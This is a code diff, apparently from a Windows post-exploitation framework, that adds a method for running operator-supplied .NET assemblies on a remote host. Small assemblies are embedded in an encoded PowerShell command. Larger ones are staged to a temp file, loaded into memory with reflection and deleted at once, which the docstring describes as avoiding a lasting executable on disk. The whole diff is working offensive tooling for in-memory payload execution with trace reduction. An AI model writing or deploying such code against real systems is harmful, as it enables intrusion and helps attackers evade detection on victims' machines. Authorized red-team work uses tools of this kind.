@@ -188,6 +188,7 @@ try {{
         type_name: str = "",
         method_name: str = "Main",
         arguments: str = "",
+        timeout: int = 60,
     ) -> str:
         pq = self.win_ps_single_quote(assembly_path)
         tn = self.win_ps_single_quote(type_name) if type_name else ""
@@ -196,7 +197,11 @@ try {{
         resolve_type = (
             f"$type = $asm.GetType('{tn}')"
             if tn
-            else "$type = $asm.GetTypes() | Where-Object { $_.GetMethod('Main', [typeof(string[])]) } | Select-Object -First 1"
+            else (
+                "$type = $asm.GetTypes() | Where-Object { "
+                "$_.GetMethod('Main', [typeof(string[])]) -or $_.GetMethod('Main') "
+                "} | Select-Object -First 1"
+            )
         )
         script = f"""
 $ErrorActionPreference = 'Stop'
@@ -205,13 +210,72 @@ $bytes = [IO.File]::ReadAllBytes($path)
 $asm = [Reflection.Assembly]::Load($bytes)
 {resolve_type}
 if (-not $type) {{ throw 'Type not found' }}
-$main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static')
+$main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static,InvokeMethod')
+if (-not $main) {{ $main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static') }}
 if (-not $main) {{ throw 'Method not found' }}
 $argLine = '{args_ps}'
-$args = if ($argLine) {{ ,@($argLine -split ' ') }} else {{ ,@([string[]]@()) }}
-$main.Invoke($null, $args) | Out-String -Width 4096
+$params = $main.GetParameters()
+if ($params.Count -eq 0) {{
+  $main.Invoke($null, $null) | Out-String -Width 4096
+}} elseif ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {{
+  $args = if ($argLine) {{ ,@($argLine -split ' ') }} else {{ ,@([string[]]@()) }}
+  $main.Invoke($null, $args) | Out-String -Width 4096
+}} else {{
+  throw 'Unsupported Main signature'
+}}
 """
-        return self.win_run_powershell(script, timeout=60)
+        return self.win_run_powershell(script, timeout=timeout)
+
+    def win_run_dotnet_assembly_bytes(
+        self,
+        assembly_bytes: bytes,
+        *,
+        type_name: str = "",
+        method_name: str = "Main",
+        arguments: str = "",
+        timeout: int = 120,
+        embed_max_bytes: int = 4500,
+    ) -> str:
+        """Load a .NET assembly from operator-side bytes (in-memory loadmodule).
+
+        Small assemblies are embedded in a single PowerShell EncodedCommand.
+        Larger ones are staged to %TEMP%, loaded with Assembly.Load, then deleted
+        in the same script (no lasting PE drop).
+        """
+        if not assembly_bytes:
+            raise ValueError("assembly_bytes is empty")
+
+        from lib.post.windows.assembly_loader import build_invoke_from_bytes_script
+
+        script = build_invoke_from_bytes_script(
+            assembly_bytes,
+            type_name=type_name,
+            method_name=method_name,
+            arguments=arguments,
+            embed_max_bytes=embed_max_bytes,
+        )
+        if script is not None:
+            return self.win_run_powershell(script, timeout=timeout)
+
+        # Stage + load + delete in one remote flow
+        import uuid
+
+        temp_out = self.win_execute("echo %TEMP%", timeout=5, wrap_job=False).strip().splitlines()
+        temp_dir = (temp_out[-1] if temp_out else "").strip() or r"C:\Windows\Temp"
+        remote_full = f"{temp_dir.rstrip('\\')}\\ks_asm_{uuid.uuid4().hex[:12]}.bin"
+        if not self.win_write_remote_bytes(assembly_bytes, remote_full):
+            raise RuntimeError(f"Failed to stage assembly to {remote_full}")
+        try:
+            out = self.win_run_dotnet_assembly(
+                remote_full,
+                type_name=type_name,
+                method_name=method_name,
+                arguments=arguments,
+                timeout=timeout,
+            )
+        finally:
+            self.win_delete_remote([remote_full])
+        return out
 
     def win_write_remote_b64_text(
         self,
